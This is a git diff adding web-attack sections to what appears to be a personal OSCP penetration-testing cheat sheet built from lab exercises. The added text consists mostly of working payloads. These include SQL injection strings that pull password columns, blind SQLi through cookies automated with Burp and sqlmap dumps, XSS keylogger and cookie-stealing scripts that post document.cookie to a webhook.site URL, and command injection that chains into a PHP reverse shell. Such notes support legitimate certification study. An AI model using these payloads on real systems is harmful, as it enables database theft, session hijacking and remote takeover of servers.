@@ -862,7 +862,7 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 **NMAP**
 ```bash
 # -F: top 100 ports
-# -T1 or -T2: slow 
+# -T1 or -T2: slow
 nmap -A -F -T2 10.10.10.10 -v
 ```
 
@@ -890,8 +890,137 @@ JWT token has three parts separated by dot. In the example, the last part(signat
 {"user":"jeremy","role":"staff"}  
 ```
 
+### LFI/RFI
+- [Ffuf File Inclusion](#ffuf-file-inclusion)
+
+### SQLi
+[SQLMAP](#sqlmap)
+
+**Using or 1=1 statement & union select**
+```bash
+jeremy' or 1=1#
+jeremy' or 1=1-- -
+
+# union select - database version
+jeremy' union select null, null, version()#
+
+# union select - database table names
+jeremy' union select null, null, table_name from information_schema.tables#
+
+# union select - database columns names
+jeremy' union select null, null, column_name from information_schema.columns#
+
+# union select - password from injection0x01 table
+jeremy' union select null, null, password from injection0x01#
+```
+
+**SQL injection can not just be username,password but cookies or anything that we can injection information**
+![image](https://github.com/nurijeon/OSCP/assets/14031269/3caf142b-861e-4765-9f9c-5a69d4788465)
+
+**Blind SQL Injection** - substring
+![image](https://github.com/nurijeon/OSCP/assets/14031269/8bf7318a-fca3-4e57-a1fb-7bfd8ab841ad)
+```bash
+# substring comparison
+Cookie: session=' or substring('a', 1, 1) = 'a'#
+
+# using substring, guess the version number
+# we need to use () for select version() because we want it to be resolved first
+Cookie: session=' or substring((select version()), 1, 1) = '8'#
+Cookie: session=' or substring((select version()), 1, 2) = '8.'#
+Cookie: session=' or substring((select version()), 1, 3) = '8.0'#
+
+# Using substring, guess the password but this will take forever. So we can handle this from intruder(burpsuite)
+Cookie: session=' or substring((select password from injection0x02 where username = 'jessamy'), 1, 1) = '8'#
+```
+
+**Blind SQL Injection** - substring && burpsuite
+1. We can guess each letter but if we want to automate this process, send this to intruder
+![image](https://github.com/nurijeon/OSCP/assets/14031269/a83e0ae8-1286-49c9-b620-f500791a07ef)
+2. Add the character we want to fuzz
+![image](https://github.com/nurijeon/OSCP/assets/14031269/82f2ae59-fac2-495b-8f52-c12f3b489731)
+3. Add a-z 0-9 on payload and start attack
+![image](https://github.com/nurijeon/OSCP/assets/14031269/3e6c4502-fa3c-4d62-b49b-3f38c5ff8542)
+4. Keep changing the substring length and fuzzing last letter
+![image](https://github.com/nurijeon/OSCP/assets/14031269/c8f94ce5-e507-49ed-bef4-77d80b2d0247)
+
+**Blind SQL Injection** - sqlmap
+1. Copy and save the request
+2. run sqlmap
+```bash
+# for cookie, we have to set level to 2
+sqlmap -r req.txt --level=2
+```
+
+### XSS
+**Reflected**
+The script you want to inject gets returned as a response
+
+**common injection** - Key stroke
+```bash
+- use fetchapi to send user keyboard input
+function logkey(event){some_api(event.key)}
+document.addEventListener('keydown', logkey)
+```
+
+**Common injection** - img tag onerror attribute
+```bash
+<img src=x onerror="windows.location.replace('https://www.naver.com')" />
+```
+
+**Common injection** - steal user cookie using https://webhook.site
+```bash
+# GET
+First fire up your python server
+python3 -m http.server 4444
+<script>let i=new Image; i.src="http://127.0.0.1:4444/?"+document.cookie;</script>
+
+# POST
+<script>
+let cookie = {"cookie": document.cookie}; fetch("https://webhook.site/363b58b8-0971-460c-bd9d-74c99e9a3f61", {method: "POST", body: JSON.stringify(cookie), headers: {"Content-Type": "application/x-www-form-urlencoded"}})
+</script>
+```
+
+### Command Injection
+- eval - eval is evil
+- Can you chain the command?
+- Can we add something
+
+****
+```bash
+# use # to ignore the rest
+https://tcm-sec.com; whoami; #
+
+# Get reverse shell
+1. check what we can use
+https://tcm-sec.com; which php; #
+https://tcm-com.com; php -r '$sock=fsockopen("eth0.ip.add.ress",4444);exec("/bin/sh -i <&3 >&3 2>&3");'; #
+```
+
+
 ## Tools
+### SQLMAP
+1. First, copy and create a file from burpsuite request
+![image](https://github.com/nurijeon/OSCP/assets/14031269/7111ba2a-e78f-4938-9435-317ce186a71f)
+
+2. run sqlmap
+```bash
+sqlmap -r req.txt
+
+# for cookie injection
+sqlmap -r req.txt --level=2
+
+# if we want to dump database
+sqlmap -r req.txt --level=2 --dump
+
+# if we want to dump specific table
+sqlmap -r req.txt --level=2 --dump -T injection0x02
+```
+
 ### Burpsuite
+#### Burpsuite Encoding
+- Ctrl+u
+- ![image](https://github.com/nurijeon/OSCP/assets/14031269/778e432d-c1ef-45be-8a69-29c79385310d)
+
 #### Burpsuite Password Bruteforce
 1. Send the req to intruder and highlight password field(where jeremy is at) and click "Add"
 ![image](https://github.com/nurijeon/OSCP/assets/14031269/d2bdfc2b-f7be-4a2d-9eb8-6c0ea69684f3)
@@ -1655,6 +1784,16 @@ curl http://admin.academy.htb:37235/admin/admin.php -X POST -d 'id=73' -H 'Conte
 ```bash
 # Find admin
 ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w nums.txt -mr 'admin' 
+```
+
+#### Ffuf File Inclusion
+1. Save a request from burpsuite
+![image](https://github.com/nurijeon/OSCP/assets/14031269/73cc134b-bd63-4f1b-9274-76fe1e447b23)
+2. Change file name to FUZZ
+![image](https://github.com/nurijeon/OSCP/assets/14031269/50ea9c72-f913-439b-8ab7-7125633dca10)
+3. Run Fuff
+```bash
+ffuf -request api_req.txt -request-proto http -w /usr/share/seclists/SecLists-master/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20
 ```
 
 ### xmllint
